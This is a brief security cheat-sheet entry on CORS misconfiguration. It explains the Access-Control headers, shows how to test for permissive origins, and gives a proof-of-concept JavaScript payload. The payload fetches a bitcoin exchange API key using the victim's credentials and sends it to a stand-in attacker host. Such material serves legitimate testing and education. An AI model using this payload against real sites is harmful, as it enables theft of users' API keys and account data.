# CORS Insecure Configuration

CORS is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the resource originated. It's essentialy a way to relax SOP which would block AJAX requests from accesing data on a web page unless it is coming from the same origin.

## Access-Control-Allow-Origin

CORS adds a few special response headers that allow which sites can access which data.

* `Access-Control-Allow-Origin`: which domains can access a domain's resources.
* `Access-Control-Allow-Credentials`: whether the browser will send cookies with the request.
* `Access-Control-Allow-Methods`: which HTTP methods can be used to access resources.

```
Access-Control-Allow-Origin: * | null // BAD
Access-Control-Allow-Credentials: true // Poorly implemented, the best case for attack
Access-Control-Allow-Methods: * // BAD
```

It's easy to check headers in multiple request/responses using tools like Burp and Spider. You can simple add a new header in request body i.e `Origin: http://mysite.com | null` and if you find `Access-Control-Allow-Origin: mysite.com | null | *` then domain is vulnerable.

## Exploitation

We can make a request for resources with stored credentials for example, leak private resources, session hijacking, etc.

CORS can lead to major security risk like leaking of API keys, other users data or even much more.

## POC: Insecure Bitcoin Exchange

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://btc-exchange/api/requestApiKey',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

* [Portswagger research](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
